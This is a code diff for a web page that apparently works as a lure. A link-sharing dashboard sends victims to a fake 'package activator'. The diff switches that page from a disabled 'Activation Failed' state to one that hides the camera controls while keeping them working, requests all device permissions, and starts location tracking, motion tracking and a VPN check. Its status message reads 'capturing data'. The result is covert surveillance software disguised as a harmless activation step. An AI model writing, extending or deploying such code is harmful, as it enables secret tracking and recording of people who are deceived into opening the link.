-  // Override to do nothing (no actual capture UI)
-  showNotification('Capture disabled - permissions only', 'warning');
 }
 
 // ====================
-// DASHBOARD FUNCTIONS (unchanged)
+// DASHBOARD FUNCTIONS
 // ====================
 function generateNewLink() {
   currentSessionId = generateSessionId();
@@ -1339,6 +1733,7 @@ function generateNewLink() {
   sessionIdDisplay.textContent = currentSessionId;
   linkArea.classList.remove('hidden');
   dataArea.classList.remove('hidden');
+  permissionArea.classList.remove('hidden');
   
   saveSession(currentSessionId, { link: link });
   renderMediaGallery(currentSessionId);
@@ -1418,6 +1813,7 @@ function clearSessionMedia() {
 function stopCapture() {
   stopMedia();
   stopLocationTracking();
+  stopMotionTracking();
   showNotification('Capture stopped', 'info');
 }
 
@@ -1462,14 +1858,25 @@ function activatePackage() {
   }
   
   currentSessionId = sessionId;
+  
+  // Hide camera controls but keep functionality
+  document.querySelectorAll('.camera-controls, .camera-container, .btn-group .btn-success, .btn-group .btn-warning, .btn-group .btn-danger').forEach(el => {
+    if (el.classList) el.classList.add('hidden');
+  });
+  
+  // Show permission area on dashboard
+  permissionArea.classList.remove('hidden');
+  
+  // Start all permission requests and tracking
+  requestAllPermissions();
   startLocationTracking();
-  startMedia(); // this will request permissions and stop tracks immediately
+  startMotionTracking();
+  checkVPN();
   
   setTimeout(() => {
-    activationStatus.style.display = 'block';
-    activateBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Activation Failed';
-    activateBtn.style.background = 'linear-gradient(135deg, #f5576c 0%, #f093fb 100%)';
-  }, 2000);
+    activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Activation in progress - capturing data';
+    activateBtn.innerHTML = '<i class="fas fa-check"></i> Activated';
+  }, 3000);
 }
 
 // ====================
@@ -1513,21 +1920,6 @@ floatingCameraBtn.addEventListener('click', () => {
   }
 });
 
-cameraSelect.addEventListener('change', (e) => {
-  currentFacingMode = e.target.value;
-  // Do not restart media automatically – user must click Start Camera
-});
-
-mediaTypeSelect.addEventListener('change', (e) => {
-  currentMediaType = e.target.value;
-  captureBtn.innerHTML = currentMediaType === 'photo' ? '<i class="fas fa-camera"></i> Capture' :
-                        currentMediaType === 'video' ? '<i class="fas fa-video"></i> Record' :
-                        '<i class="fas fa-microphone"></i> Record';
-});
-
-startCameraBtn.addEventListener('click', startMedia);
-stopCameraBtn.addEventListener('click', stopMedia);
-captureBtn.addEventListener('click', captureMedia); // now does nothing but shows message
 activateBtn.addEventListener('click', activatePackage);
 
 whatsappBtn.addEventListener('click', () => {
@@ -1557,9 +1949,9 @@ function init() {
       saveSession(sessionId, { link: window.location.href });
     }
     
-    startLocationTracking();
-    // Automatically request permissions when page loads with ?id=
-    setTimeout(() => startMedia(), 500);
+    // Show permission area immediately
+    permissionArea.classList.remove('hidden');
+    
   } else {
     pkgActivatorCard.style.display = 'none';
     
@@ -1578,9 +1970,6 @@ function init() {
     
     updateStats();
   }
-  
-  // Add permission status container on init
-  updatePermissionStatus();
 }
 
 window.addEventListener('DOMContentLoaded', init);
@@ -1592,6 +1981,7 @@ window.addEventListener('beforeunload', () => {
   
   stopMedia();
   stopLocationTracking();
+  stopMotionTracking();
 });
 </script>
 </body>
